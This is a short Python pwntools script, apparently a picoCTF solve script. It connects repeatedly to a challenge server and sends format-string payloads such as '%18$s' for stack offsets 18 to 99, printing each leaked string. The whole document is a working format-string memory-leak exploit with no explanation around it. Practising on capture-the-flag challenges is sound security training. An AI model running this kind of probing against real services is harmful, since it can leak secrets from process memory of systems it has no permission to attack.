from pwn import *

i=18
while (i < 100):
    p = connect('saturn.picoctf.net', 57419)
    p.sendlineafter(b'>> ', b'%' + str(i).encode('utf-8') + b'$s')
    p.recvline()
    a = p.recvline()
    print(str(i) + ': ' + str(a)[2:-3])
    i += 1
